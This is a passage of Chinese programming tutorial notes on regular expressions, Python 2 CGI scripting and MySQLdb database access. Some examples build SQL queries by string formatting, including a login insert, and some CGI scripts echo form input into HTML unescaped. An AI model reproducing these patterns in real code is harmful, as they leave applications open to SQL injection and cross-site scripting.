		请注意，单词 Chapter 和后面的空格的位置相对于中括号内的字符是固定的。中括号表达式指定的只是匹配紧跟在单词 Chapter 和空格后面的单个字符位置的字符集。这是第九个字符位置。

		若要使用范围代替字符本身来表示匹配字符组，请使用连字符 (-) 将范围中的开始字符和结束字符分开。单个字符的字符值确定范围内的相对顺序。下面的正则表达式包含范围表达式，该范围表达式等效于上面显示的中括号中的列表。

		/Chapter [1-5]/

		当以这种方式指定范围时，开始值和结束值两者都包括在范围内。注意，还有一点很重要，按 Unicode 排序顺序，开始值必须在结束值的前面。

		若要在中括号表达式中包括连字符，请采用下列方法之一：

			用反斜扛将它转义：

			[\-]

			将连字符放在中括号列表的开始或结尾。下面的表达式匹配所有小写字母和连字符：

			[-a-z]
			[a-z-]

			创建一个范围，在该范围中，开始字符值小于连字符，而结束字符值等于或大于连字符。下面的两个正则表达式都满足这一要求：

			[!--]
			[!-~]

		若要查找不在列表或范围内的所有字符，请将插入符号 (^) 放在列表的开头。如果插入字符出现在列表中的其他任何位置，则它匹配其本身。下面的正则表达式匹配1、2、3、4 或 5 之外的任何数字和字符：

		/Chapter [^12345]/

		在上面的示例中，表达式在第九个位置匹配 1、2、3、4 或 5 之外的任何数字和字符。这样，例如，Chapter 7 就是一个匹配项，Chapter 9 也是一个匹配项。

		上面的表达式可以使用连字符 (-) 来表示：

		/Chapter [^1-5]/

		中括号表达式的典型用途是指定任何大写或小写字母或任何数字的匹配。下面的表达式指定这样的匹配：

		/[A-Za-z0-9]/

		替换和分组

		替换使用 | 字符来允许在两个或多个替换选项之间进行选择。例如，可以扩展章节标题正则表达式，以返回比章标题范围更广的匹配项。但是，这并不象您可能认为的那样简单。替换匹配 | 字符任一侧最大的表达式。

		您可能认为，下面的表达式匹配出现在行首和行尾、后面跟一个或两个数字的 Chapter 或 Section：

		/^Chapter|Section [1-9][0-9]{0,1}$/

		很遗憾，上面的正则表达式要么匹配行首的单词 Chapter，要么匹配行尾的单词 Section 及跟在其后的任何数字。如果输入字符串是 Chapter 22，那么上面的表达式只匹配单词 Chapter。如果输入字符串是 Section 22，那么该表达式匹配 Section 22。

		若要使正则表达式更易于控制，可以使用括号来限制替换的范围，即，确保它只应用于两个单词 Chapter 和 Section。但是，括号也用于创建子表达式，并可能捕获它们以供以后使用，这一点在有关反向引用的那一节讲述。通过在上面的正则表达式的适当位置添加括号，就可以使该正则表达式匹配 Chapter 1 或 Section 3。

		下面的正则表达式使用括号来组合 Chapter 和 Section，以便表达式正确地起作用：

		/^(Chapter|Section) [1-9][0-9]{0,1}$/

		尽管这些表达式正常工作，但 Chapter|Section 周围的括号还将捕获两个匹配字中的任一个供以后使用。由于在上面的表达式中只有一组括号，因此，只有一个被捕获的"子匹配项"。

		在上面的示例中，您只需要使用括号来组合单词 Chapter 和 Section 之间的选择。若要防止匹配被保存以备将来使用，请在括号内正则表达式模式之前放置 ?:。下面的修改提供相同的能力而不保存子匹配项：

		/^(?:Chapter|Section) [1-9][0-9]{0,1}$/

		除 ?: 元字符外，两个其他非捕获元字符创建被称为"预测先行"匹配的某些内容。正向预测先行使用 ?= 指定，它匹配处于括号中匹配正则表达式模式的起始点的搜索字符串。反向预测先行使用 ?! 指定，它匹配处于与正则表达式模式不匹配的字符串的起始点的搜索字符串。

		例如，假设您有一个文档，该文档包含指向 Windows 3.1、Windows 95、Windows 98 和 Windows NT 的引用。再进一步假设，您需要更新该文档，将指向 Windows 95、Windows 98 和 Windows NT 的所有引用更改为 Windows 2000。下面的正则表达式（这是一个正向预测先行的示例）匹配 Windows 95、Windows 98 和 Windows NT：

		/Windows(?=95 |98 |NT )/

		找到一处匹配后，紧接着就在匹配的文本（不包括预测先行中的字符）之后搜索下一处匹配。例如，如果上面的表达式匹配 Windows 98，将在 Windows 之后而不是在 98 之后继续搜索。
		其他示例

		下面列出一些正则表达式示例：
		正则表达式 	描述
		/\b([a-z]+) \1\b/gi 	一个单词连续出现的位置。
		/(\w+):\/\/([^/:]+)(:\d*)?([^# ]*)/ 	将一个URL解析为协议、域、端口及相对路径。
		/^(?:Chapter|Section) [1-9][0-9]{0,1}$/ 	定位章节的位置。
		/[-a-z]/ 	a至z共26个字母再加一个-号。
		/ter\b/ 	可匹配chapter，而不能匹配terminal。
		/\Bapt/ 	可匹配chapter，而不能匹配aptitude。
		/Windows(?=95 |98 |NT )/ 	可匹配Windows95或Windows98或WindowsNT，当找到一个匹配后，从Windows后面开始进行下一次的检索匹配。
		/^\s*$/ 	匹配空行。
		/\d{2}-\d{5}/ 	验证由两位数字、一个连字符再加 5 位数字组成的 ID 号。
		/<\s*(\S+)(\s[^>]*)?>[\s\S]*<\s*\/\1\s*>/ 	匹配 HTML 标记。
		
	正则表达式在线测试
		https://c.runoob.com/front-end/854
		
		JavaScript - JavaScript 正则表达式
			var pattern = //,
				str = '';
			console.log(pattern.test(str));

		PHP
			$str = '';
			$isMatched = preg_match('//', $str, $matches);
			var_dump($isMatched, $matches);

		Go
			package main
			import (
				"fmt"
				"regexp"
			)

			func main() {
				str := ""
				matched, err := regexp.MatchString("", str)
				fmt.Println(matched, err)
			}

		JAVA - Java 正则表达式
			import java.util.regex.Matcher;
			import java.util.regex.Pattern;

			public class RegexMatches {
				
				public static void main(String args[]) {
					String str = "";
					String pattern = "";

					Pattern r = Pattern.compile(pattern);
					Matcher m = r.matcher(str);
					System.out.println(m.matches());
				}

			}

		Ruby - Ruby 正则表达式
			pattern = //
			str = ''
			p pattern.match(str)

		Python - Python 正则表达式
			import re
			pattern = re.compile(ur'')
			str = u''
			print(pattern.search(str))



Python CGI编程
	什么是CGI

	CGI 目前由NCSA维护，NCSA定义CGI如下：

	CGI(Common Gateway Interface),通用网关接口,它是一段程序,运行在服务器上如：HTTP服务器，提供同客户端HTML页面的接口。
	网页浏览

	为了更好的了解CGI是如何工作的，我们可以从在网页上点击一个链接或URL的流程：

		1、使用你的浏览器访问URL并连接到HTTP web 服务器。
		2、Web服务器接收到请求信息后会解析URL，并查找访问的文件在服务器上是否存在，如果存在返回文件的内容，否则返回错误信息。
		3、浏览器从服务器上接收信息，并显示接收的文件或者错误信息。

	CGI程序可以是Python脚本，PERL脚本，SHELL脚本，C或者C++程序等。
	CGI架构图

	cgiarch
	Web服务器支持及配置

	在你进行CGI编程前，确保您的Web服务器支持CGI及已经配置了CGI的处理程序。

	Apache 支持CGI 配置：

	设置好CGI目录：

	ScriptAlias /cgi-bin/ /var/www/cgi-bin/

	所有的HTTP服务器执行CGI程序都保存在一个预先配置的目录。这个目录被称为CGI目录，并按照惯例，它被命名为/var/www/cgi-bin目录。

	CGI文件的扩展名为.cgi，python也可以使用.py扩展名。

	默认情况下，Linux服务器配置运行的cgi-bin目录中为/var/www。

	如果你想指定其他运行 CGI 脚本的目录，可以修改 httpd.conf 配置文件，如下所示：

	<Directory "/var/www/cgi-bin">
	   AllowOverride None
	   Options +ExecCGI
	   Order allow,deny
	   Allow from all
	</Directory>

	在 AddHandler 中添加 .py 后缀，这样我们就可以访问 .py 结尾的 python 脚本文件：

	AddHandler cgi-script .cgi .pl .py

	第一个CGI程序

	我们使用Python创建第一个CGI程序，文件名为hello.py，文件位于/var/www/cgi-bin目录中，内容如下：

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	print "Content-type:text/html"
	print                               # 空行，告诉服务器结束头部
	print '<html>'
	print '<head>'
	print '<meta charset="utf-8">'
	print '<title>Hello Word - 我的第一个 CGI 程序！</title>'
	print '</head>'
	print '<body>'
	print '<h2>Hello Word! 我是来自菜鸟教程的第一CGI程序</h2>'
	print '</body>'
	print '</html>'

	文件保存后修改 hello.py，修改文件权限为 755：

	chmod 755 hello.py 

	以上程序在浏览器访问显示结果如下：

	这个的hello.py脚本是一个简单的Python脚本，脚本第一行的输出内容"Content-type:text/html"发送到浏览器并告知浏览器显示的内容类型为"text/html"。

	用 print 输出一个空行用于告诉服务器结束头部信息。
	HTTP头部

	hello.py文件内容中的" Content-type:text/html"即为HTTP头部的一部分，它会发送给浏览器告诉浏览器文件的内容类型。

	HTTP头部的格式如下：

	HTTP 字段名: 字段内容

	例如：

	Content-type: text/html

	以下表格介绍了CGI程序中HTTP头部经常使用的信息：
	头	描述
	Content-type: 	请求的与实体对应的MIME信息。例如: Content-type:text/html
	Expires: Date 	响应过期的日期和时间
	Location: URL 	用来重定向接收方到非请求URL的位置来完成请求或标识新的资源
	Last-modified: Date	请求资源的最后修改时间
	Content-length: N	请求的内容长度
	Set-Cookie: String 	设置Http Cookie
	CGI环境变量

	所有的CGI程序都接收以下的环境变量，这些变量在CGI程序中发挥了重要的作用：
	变量名	描述
	CONTENT_TYPE	这个环境变量的值指示所传递来的信息的MIME类型。目前，环境变量CONTENT_TYPE一般都是：application/x-www-form-urlencoded,他表示数据来自于HTML表单。
	CONTENT_LENGTH	如果服务器与CGI程序信息的传递方式是POST，这个环境变量即使从标准输入STDIN中可以读到的有效数据的字节数。这个环境变量在读取所输入的数据时必须使用。
	HTTP_COOKIE	客户机内的 COOKIE 内容。
	HTTP_USER_AGENT	提供包含了版本数或其他专有数据的客户浏览器信息。
	PATH_INFO	这个环境变量的值表示紧接在CGI程序名之后的其他路径信息。它常常作为CGI程序的参数出现。
	QUERY_STRING	如果服务器与CGI程序信息的传递方式是GET，这个环境变量的值即使所传递的信息。这个信息经跟在CGI程序名的后面，两者中间用一个问号'?'分隔。
	REMOTE_ADDR	这个环境变量的值是发送请求的客户机的IP地址，例如上面的192.168.1.67。这个值总是存在的。而且它是Web客户机需要提供给Web服务器的唯一标识，可以在CGI程序中用它来区分不同的Web客户机。
	REMOTE_HOST	这个环境变量的值包含发送CGI请求的客户机的主机名。如果不支持你想查询，则无需定义此环境变量。
	REQUEST_METHOD	提供脚本被调用的方法。对于使用 HTTP/1.0 协议的脚本，仅 GET 和 POST 有意义。
	SCRIPT_FILENAME	CGI脚本的完整路径
	SCRIPT_NAME	CGI脚本的的名称
	SERVER_NAME	这是你的 WEB 服务器的主机名、别名或IP地址。
	SERVER_SOFTWARE	这个环境变量的值包含了调用CGI程序的HTTP服务器的名称和版本号。例如，上面的值为Apache/2.2.14(Unix)

	以下是一个简单的CGI脚本输出CGI的环境变量：

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-
	# filename:test.py

	import os

	print "Content-type: text/html"
	print
	print "<meta charset=\"utf-8\">"
	print "<b>环境变量</b><br>";
	print "<ul>"
	for key in os.environ.keys():
		print "<li><span style='color:green'>%30s </span> : %s </li>" % (key,os.environ[key])
	print "</ul>"

	将以上点保存为 test.py ,并修改文件权限为 755，执行结果如下：

	GET和POST方法

	浏览器客户端通过两种方法向服务器传递信息，这两种方法就是 GET 方法和 POST 方法。
	使用GET方法传输数据

	GET方法发送编码后的用户信息到服务端，数据信息包含在请求页面的URL上，以"?"号分割, 如下所示：

	http://www.test.com/cgi-bin/hello.py?key1=value1&key2=value2

	有关 GET 请求的其他一些注释：

		GET 请求可被缓存
		GET 请求保留在浏览器历史记录中
		GET 请求可被收藏为书签
		GET 请求不应在处理敏感数据时使用
		GET 请求有长度限制
		GET 请求只应当用于取回数据

	简单的url实例：GET方法

	以下是一个简单的URL，使用GET方法向hello_get.py程序发送两个参数：

	/cgi-bin/test.py?name=菜鸟教程&url=http://www.runoob.com

	以下为hello_get.py文件的代码：

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	# filename：test.py

	# CGI处理模块
	import cgi, cgitb 

	# 创建 FieldStorage 的实例化
	form = cgi.FieldStorage() 

	# 获取数据
	site_name = form.getvalue('name')
	site_url  = form.getvalue('url')

	print "Content-type:text/html"
	print
	print "<html>"
	print "<head>"
	print "<meta charset=\"utf-8\">"
	print "<title>菜鸟教程 CGI 测试实例</title>"
	print "</head>"
	print "<body>"
	print "<h2>%s官网：%s</h2>" % (site_name, site_url)
	print "</body>"
	print "</html>"

	文件保存后修改 hello_get.py，修改文件权限为 755：

	chmod 755 hello_get.py 

	浏览器请求输出结果：

	简单的表单实例：GET方法

	以下是一个通过HTML的表单使用GET方法向服务器发送两个数据，提交的服务器脚本同样是hello_get.py文件，hello_get.html 代码如下：

	<!DOCTYPE html>
	<html>
	<head>
	<meta charset="utf-8">
	<title>菜鸟教程(runoob.com)</title>
	</head>
	<body>
	<form action="/cgi-bin/hello_get.py" method="get">
	站点名称: <input type="text" name="name">  <br />

	站点 URL: <input type="text" name="url" />
	<input type="submit" value="提交" />
	</form>
	</body>
	</html>

	默认情况下 cgi-bin 目录只能存放脚本文件，我们将 hello_get.html 存储在 test 目录下，修改文件权限为 755：

	chmod 755 hello_get.html

	Gif 演示如下所示：

	使用POST方法传递数据

	使用POST方法向服务器传递数据是更安全可靠的，像一些敏感信息如用户密码等需要使用POST传输数据。

	以下同样是hello_get.py ，它也可以处理浏览器提交的POST表单数据:

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	# CGI处理模块
	import cgi, cgitb 

	# 创建 FieldStorage 的实例化
	form = cgi.FieldStorage() 

	# 获取数据
	site_name = form.getvalue('name')
	site_url  = form.getvalue('url')

	print "Content-type:text/html"
	print
	print "<html>"
	print "<head>"
	print "<meta charset=\"utf-8\">"
	print "<title>菜鸟教程 CGI 测试实例</title>"
	print "</head>"
	print "<body>"
	print "<h2>%s官网：%s</h2>" % (site_name, site_url)
	print "</body>"
	print "</html>"

	以下为表单通过POST方法（method="post"）向服务器脚本 hello_get.py 提交数据:

	<!DOCTYPE html>
	<html>
	<head>
	<meta charset="utf-8">
	<title>菜鸟教程(runoob.com)</title>
	</head>
	<body>
	<form action="/cgi-bin/hello_get.py" method="post">
	站点名称: <input type="text" name="name">  <br />

	站点 URL: <input type="text" name="url" />
	<input type="submit" value="提交" />
	</form>
	</body>
	</html>

	Gif 演示如下所示：

	通过CGI程序传递checkbox数据

	checkbox用于提交一个或者多个选项数据，HTML代码如下：

	<!DOCTYPE html>
	<html>
	<head>
	<meta charset="utf-8">
	<title>菜鸟教程(runoob.com)</title>
	</head>
	<body>
	<form action="/cgi-bin/checkbox.py" method="POST" target="_blank">
	<input type="checkbox" name="runoob" value="on" /> 菜鸟教程
	<input type="checkbox" name="google" value="on" /> Google
	<input type="submit" value="选择站点" />
	</form>
	</body>
	</html>

	以下为 checkbox.py 文件的代码：

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	# 引入 CGI 处理模块 
	import cgi, cgitb 

	# 创建 FieldStorage的实例 
	form = cgi.FieldStorage() 

	# 接收字段数据
	if form.getvalue('google'):
	   google_flag = "是"
	else:
	   google_flag = "否"

	if form.getvalue('runoob'):
	   runoob_flag = "是"
	else:
	   runoob_flag = "否"

	print "Content-type:text/html"
	print
	print "<html>"
	print "<head>"
	print "<meta charset=\"utf-8\">"
	print "<title>菜鸟教程 CGI 测试实例</title>"
	print "</head>"
	print "<body>"
	print "<h2> 菜鸟教程是否选择了 : %s</h2>" % runoob_flag
	print "<h2> Google 是否选择了 : %s</h2>" % google_flag
	print "</body>"
	print "</html>"

	修改 checkbox.py 权限：

	chmod 755 checkbox.py

	浏览器访问 Gif 演示图：

	通过CGI程序传递Radio数据

	Radio 只向服务器传递一个数据，HTML代码如下：

	<!DOCTYPE html>
	<html>
	<head>
	<meta charset="utf-8">
	<title>菜鸟教程(runoob.com)</title>
	</head>
	<body>
	<form action="/cgi-bin/radiobutton.py" method="post" target="_blank">
	<input type="radio" name="site" value="runoob" /> 菜鸟教程
	<input type="radio" name="site" value="google" /> Google
	<input type="submit" value="提交" />
	</form>
	</body>
	</html>

	radiobutton.py 脚本代码如下：

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	# 引入 CGI 处理模块 
	import cgi, cgitb 

	# 创建 FieldStorage的实例 
	form = cgi.FieldStorage() 

	# 接收字段数据
	if form.getvalue('site'):
	   site = form.getvalue('site')
	else:
	   site = "提交数据为空"

	print "Content-type:text/html"
	print
	print "<html>"
	print "<head>"
	print "<meta charset=\"utf-8\">"
	print "<title>菜鸟教程 CGI 测试实例</title>"
	print "</head>"
	print "<body>"
	print "<h2> 选中的网站是 %s</h2>" % site
	print "</body>"
	print "</html>"

	修改 radiobutton.py 权限：

	chmod 755 radiobutton.py

	浏览器访问 Gif 演示图：

	通过CGI程序传递 Textarea 数据

	Textarea 向服务器传递多行数据，HTML代码如下：

	<!DOCTYPE html>
	<html>
	<head>
	<meta charset="utf-8">
	<title>菜鸟教程(runoob.com)</title>
	</head>
	<body>
	<form action="/cgi-bin/textarea.py" method="post" target="_blank">
	<textarea name="textcontent" cols="40" rows="4">
	在这里输入内容...
	</textarea>
	<input type="submit" value="提交" />
	</form>
	</body>
	</html>

	textarea.py 脚本代码如下：

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	# 引入 CGI 处理模块 
	import cgi, cgitb 

	# 创建 FieldStorage的实例 
	form = cgi.FieldStorage() 

	# 接收字段数据
	if form.getvalue('textcontent'):
	   text_content = form.getvalue('textcontent')
	else:
	   text_content = "没有内容"

	print "Content-type:text/html"
	print
	print "<html>"
	print "<head>";
	print "<meta charset=\"utf-8\">"
	print "<title>菜鸟教程 CGI 测试实例</title>"
	print "</head>"
	print "<body>"
	print "<h2> 输入的内容是：%s</h2>" % text_content
	print "</body>"
	print "</html>"

	修改 textarea.py 权限：

	chmod 755 textarea.py

	浏览器访问 Gif 演示图：

	通过CGI程序传递下拉数据。

	HTML 下拉框代码如下：

	<!DOCTYPE html>
	<html>
	<head>
	<meta charset="utf-8">
	<title>菜鸟教程(runoob.com)</title>
	</head>
	<body>
	<form action="/cgi-bin/dropdown.py" method="post" target="_blank">
	<select name="dropdown">
	<option value="runoob" selected>菜鸟教程</option>
	<option value="google">Google</option>
	</select>
	<input type="submit" value="提交"/>
	</form>
	</body>
	</html>

	dropdown.py 脚本代码如下所示：

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	# 引入 CGI 处理模块 
	import cgi, cgitb 

	# 创建 FieldStorage的实例 
	form = cgi.FieldStorage() 

	# 接收字段数据
	if form.getvalue('dropdown'):
	   dropdown_value = form.getvalue('dropdown')
	else:
	   dropdown_value = "没有内容"

	print "Content-type:text/html"
	print
	print "<html>"
	print "<head>"
	print "<meta charset=\"utf-8\">"
	print "<title>菜鸟教程 CGI 测试实例</title>"
	print "</head>"
	print "<body>"
	print "<h2> 选中的选项是：%s</h2>" % dropdown_value
	print "</body>"
	print "</html>"

	修改 dropdown.py 权限：

	chmod 755 dropdown.py

	浏览器访问 Gif 演示图：

	CGI中使用Cookie

	在 http 协议一个很大的缺点就是不对用户身份的进行判断，这样给编程人员带来很大的不便， 而 cookie 功能的出现弥补了这个不足。

	cookie 就是在客户访问脚本的同时，通过客户的浏览器，在客户硬盘上写入纪录数据 ，当下次客户访问脚本时取回数据信息，从而达到身份判别的功能，cookie 常用在身份校验中。
	　
	cookie的语法

	http cookie的发送是通过http头部来实现的，他早于文件的传递，头部set-cookie的语法如下：

	Set-cookie:name=name;expires=date;path=path;domain=domain;secure 

		name=name: 需要设置cookie的值(name不能使用";"和","号),有多个name值时用 ";" 分隔，例如：name1=name1;name2=name2;name3=name3。
		expires=date: cookie的有效期限,格式： expires="Wdy,DD-Mon-YYYY HH:MM:SS"
		path=path: 设置cookie支持的路径,如果path是一个路径，则cookie对这个目录下的所有文件及子目录生效，例如： path="/cgi-bin/"，如果path是一个文件，则cookie指对这个文件生效，例如：path="/cgi-bin/cookie.cgi"。
		domain=domain: 对cookie生效的域名，例如：domain="www.runoob.com"
		secure: 如果给出此标志，表示cookie只能通过SSL协议的https服务器来传递。
		cookie的接收是通过设置环境变量HTTP_COOKIE来实现的，CGI程序可以通过检索该变量获取cookie信息。

	Cookie设置

	Cookie的设置非常简单，cookie会在http头部单独发送。以下实例在cookie中设置了name 和 expires：

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-
	# 
	print 'Content-Type: text/html'
	print 'Set-Cookie: name="菜鸟教程";expires=Wed, 28 Aug 2016 18:30:00 GMT'
	print
	print """
	<html>
		<head>
			<meta charset="utf-8">
			<title>菜鸟教程(runoob.com)</title>
		</head>
		<body>
			<h1>Cookie set OK!</h1>
		</body>
	</html>
	"""

	将以上代码保存到 cookie_set.py，并修改 cookie_set.py 权限：

	chmod 755 cookie_set.py

	以上实例使用了 Set-Cookie 头信息来设置Cookie信息，可选项中设置了Cookie的其他属性，如过期时间Expires，域名Domain，路径Path。这些信息设置在 "Content-type:text/html"之前。
	检索Cookie信息

	Cookie信息检索页非常简单，Cookie信息存储在CGI的环境变量HTTP_COOKIE中，存储格式如下：

	key1=value1;key2=value2;key3=value3....

	以下是一个简单的CGI检索cookie信息的程序：

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	# 导入模块
	import os
	import Cookie

	print "Content-type: text/html"
	print

	print """
	<html>
	<head>
	<meta charset="utf-8">
	<title>菜鸟教程(runoob.com)</title>
	</head>
	<body>
	<h1>读取cookie信息</h1>
	"""

	if 'HTTP_COOKIE' in os.environ:
		cookie_string=os.environ.get('HTTP_COOKIE')
		c=Cookie.SimpleCookie()
		c.load(cookie_string)

		try:
			data=c['name'].value
			print "cookie data: "+data+"<br>"
		except KeyError:
			print "cookie 没有设置或者已过去<br>"
	print """
	</body>
	</html>

	"""

	将以上代码保存到 cookie_get.py，并修改 cookie_get.py 权限：

	chmod 755 cookie_get.py

	以上 cookie 设置颜色 Gif 如下所示：

	文件上传实例

	HTML设置上传文件的表单需要设置 enctype 属性为 multipart/form-data，代码如下所示：

	<!DOCTYPE html>
	<html>
	<head>
	<meta charset="utf-8">
	<title>菜鸟教程(runoob.com)</title>
	</head>
	<body>
	 <form enctype="multipart/form-data" 
						 action="/cgi-bin/save_file.py" method="post">
	   <p>选中文件: <input type="file" name="filename" /></p>
	   <p><input type="submit" value="上传" /></p>
	   </form>
	</body>
	</html>

	save_file.py脚本文件代码如下：

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	import cgi, os
	import cgitb; cgitb.enable()

	form = cgi.FieldStorage()

	# 获取文件名
	fileitem = form['filename']

	# 检测文件是否上传
	if fileitem.filename:
	   # 设置文件路径 
	   fn = os.path.basename(fileitem.filename)
	   open('/tmp/' + fn, 'wb').write(fileitem.file.read())

	   message = '文件 "' + fn + '" 上传成功'
	   
	else:
	   message = '文件没有上传'
	   
	print """\
	Content-Type: text/html\n
	<html>
	<head>
	<meta charset="utf-8">
	<title>菜鸟教程(runoob.com)</title>
	</head>
	<body>
	   <p>%s</p>
	</body>
	</html>
	""" % (message,)

	将以上代码保存到 save_file.py，并修改 save_file.py 权限：

	chmod 755 save_file.py

	以上 cookie 设置颜色 Gif 如下所示：

	如果你使用的系统是Unix/Linux，你必须替换文件分隔符，在window下只需要使用open()语句即可：

	fn = os.path.basename(fileitem.filename.replace("\\", "/" ))

	文件下载对话框

	我们先在当前目录下创建 foo.txt 文件，用于程序的下载。

	文件下载通过设置HTTP头信息来实现，功能代码如下：

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	# HTTP 头部
	print "Content-Disposition: attachment; filename=\"foo.txt\"";
	print
	# 打开文件
	fo = open("foo.txt", "rb")

	str = fo.read();
	print str

	# 关闭文件
	fo.close()


python操作mysql数据库

	Python 标准数据库接口为 Python DB-API，Python DB-API为开发人员提供了数据库应用编程接口。

	Python 数据库接口支持非常多的数据库，你可以选择适合你项目的数据库：

		GadFly
		mSQL
		MySQL
		PostgreSQL
		Microsoft SQL Server 2000
		Informix
		Interbase
		Oracle
		Sybase

	你可以访问Python数据库接口及API查看详细的支持数据库列表。

	不同的数据库你需要下载不同的DB API模块，例如你需要访问Oracle数据库和Mysql数据，你需要下载Oracle和MySQL数据库模块。

	DB-API 是一个规范. 它定义了一系列必须的对象和数据库存取方式, 以便为各种各样的底层数据库系统和多种多样的数据库接口程序提供一致的访问接口 。

	Python的DB-API，为大多数的数据库实现了接口，使用它连接各数据库后，就可以用相同的方式操作各数据库。

	Python DB-API使用流程：

		引入 API 模块。
		获取与数据库的连接。
		执行SQL语句和存储过程。
		关闭数据库连接。

	什么是MySQLdb?

	MySQLdb 是用于Python链接Mysql数据库的接口，它实现了 Python 数据库 API 规范 V2.0，基于 MySQL C API 上建立的。
	如何安装MySQLdb?

	为了用DB-API编写MySQL脚本，必须确保已经安装了MySQL。复制以下代码，并执行：

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	import MySQLdb

	如果执行后的输出结果如下所示，意味着你没有安装 MySQLdb 模块：

	Traceback (most recent call last):
	  File "test.py", line 3, in <module>
		import MySQLdb
	ImportError: No module named MySQLdb

	安装MySQLdb，请访问 http://sourceforge.net/projects/mysql-python ，(Linux平台可以访问：https://pypi.python.org/pypi/MySQL-python)从这里可选择适合您的平台的安装包，分为预编译的二进制文件和源代码安装包。

	如果您选择二进制文件发行版本的话，安装过程基本安装提示即可完成。如果从源代码进行安装的话，则需要切换到MySQLdb发行版本的顶级目录，并键入下列命令:

	$ gunzip MySQL-python-1.2.2.tar.gz
	$ tar -xvf MySQL-python-1.2.2.tar
	$ cd MySQL-python-1.2.2
	$ python setup.py build
	$ python setup.py install

	注意：请确保您有root权限来安装上述模块。
	数据库连接

	连接数据库前，请先确认以下事项：

		您已经创建了数据库 TESTDB.
		在TESTDB数据库中您已经创建了表 EMPLOYEE
		EMPLOYEE表字段为 FIRST_NAME, LAST_NAME, AGE, SEX 和 INCOME。
		连接数据库TESTDB使用的用户名为 "testuser" ，密码为 "test123",你可以可以自己设定或者直接使用root用户名及其密码，Mysql数据库用户授权请使用Grant命令。
		在你的机子上已经安装了 Python MySQLdb 模块。
		如果您对sql语句不熟悉，可以访问我们的 SQL基础教程

	实例：

	以下实例链接Mysql的TESTDB数据库：

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	import MySQLdb

	# 打开数据库连接
	db = MySQLdb.connect("localhost","testuser","test123","TESTDB" )

	# 使用cursor()方法获取操作游标 
	cursor = db.cursor()

	# 使用execute方法执行SQL语句
	cursor.execute("SELECT VERSION()")

	# 使用 fetchone() 方法获取一条数据
	data = cursor.fetchone()

	print "Database version : %s " % data

	# 关闭数据库连接
	db.close()

	执行以上脚本输出结果如下：

	Database version : 5.0.45

	创建数据库表

	如果数据库连接存在我们可以使用execute()方法来为数据库创建表，如下所示创建表EMPLOYEE：

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	import MySQLdb

	# 打开数据库连接
	db = MySQLdb.connect("localhost","testuser","test123","TESTDB" )

	# 使用cursor()方法获取操作游标 
	cursor = db.cursor()

	# 如果数据表已经存在使用 execute() 方法删除表。
	cursor.execute("DROP TABLE IF EXISTS EMPLOYEE")

	# 创建数据表SQL语句
	sql = """CREATE TABLE EMPLOYEE (
			 FIRST_NAME  CHAR(20) NOT NULL,
			 LAST_NAME  CHAR(20),
			 AGE INT,  
			 SEX CHAR(1),
			 INCOME FLOAT )"""

	cursor.execute(sql)

	# 关闭数据库连接
	db.close()

	数据库插入操作

	以下实例使用执行 SQL INSERT 语句向表 EMPLOYEE 插入记录：

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	import MySQLdb

	# 打开数据库连接
	db = MySQLdb.connect("localhost","testuser","test123","TESTDB" )

	# 使用cursor()方法获取操作游标 
	cursor = db.cursor()

	# SQL 插入语句
	sql = """INSERT INTO EMPLOYEE(FIRST_NAME,
			 LAST_NAME, AGE, SEX, INCOME)
			 VALUES ('Mac', 'Mohan', 20, 'M', 2000)"""
	try:
	   # 执行sql语句
	   cursor.execute(sql)
	   # 提交到数据库执行
	   db.commit()
	except:
	   # Rollback in case there is any error
	   db.rollback()

	# 关闭数据库连接
	db.close()

	以上例子也可以写成如下形式：

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	import MySQLdb

	# 打开数据库连接
	db = MySQLdb.connect("localhost","testuser","test123","TESTDB" )

	# 使用cursor()方法获取操作游标 
	cursor = db.cursor()

	# SQL 插入语句
	sql = "INSERT INTO EMPLOYEE(FIRST_NAME, \
		   LAST_NAME, AGE, SEX, INCOME) \
		   VALUES ('%s', '%s', '%d', '%c', '%d' )" % \
		   ('Mac', 'Mohan', 20, 'M', 2000)
	try:
	   # 执行sql语句
	   cursor.execute(sql)
	   # 提交到数据库执行
	   db.commit()
	except:
	   # 发生错误时回滚
	   db.rollback()

	# 关闭数据库连接
	db.close()

	实例：

	以下代码使用变量向SQL语句中传递参数:

	..................................
	user_id = "test123"
	password = "password"

	con.execute('insert into Login values("%s", "%s")' % \
				 (user_id, password))
	..................................

	数据库查询操作

	Python查询Mysql使用 fetchone() 方法获取单条数据, 使用fetchall() 方法获取多条数据。

		fetchone(): 该方法获取下一个查询结果集。结果集是一个对象
		fetchall():接收全部的返回结果行.
		rowcount: 这是一个只读属性，并返回执行execute()方法后影响的行数。

	实例：

	查询EMPLOYEE表中salary（工资）字段大于1000的所有数据：

	#!/usr/bin/python
	# -*- coding: UTF-8 -*-

	import MySQLdb

	# 打开数据库连接
	db = MySQLdb.connect("localhost","testuser","test123","TESTDB" )

	# 使用cursor()方法获取操作游标 
	cursor = db.cursor()

	# SQL 查询语句
	sql = "SELECT * FROM EMPLOYEE \
		   WHERE INCOME > '%d'" % (1000)
	try:
	   # 执行SQL语句
	   cursor.execute(sql)
	   # 获取所有记录列表
	   results = cursor.fetchall()
	   for row in results:
		  fname = row[0]
		  lname = row[1]
		  age = row[2]
		  sex = row[3]
		  income = row[4]
		  # 打印结果
		  print "fname=%s,lname=%s,age=%d,sex=%s,income=%d" % \
				 (fname, lname, age, sex, income )
	except:
	   print "Error: unable to fecth data"

	# 关闭数据库连接
	db.close()

	以上脚本执行结果如下：

	fname=Mac, lname=Mohan, age=20, sex=M, income=2000

	数据库更新操作

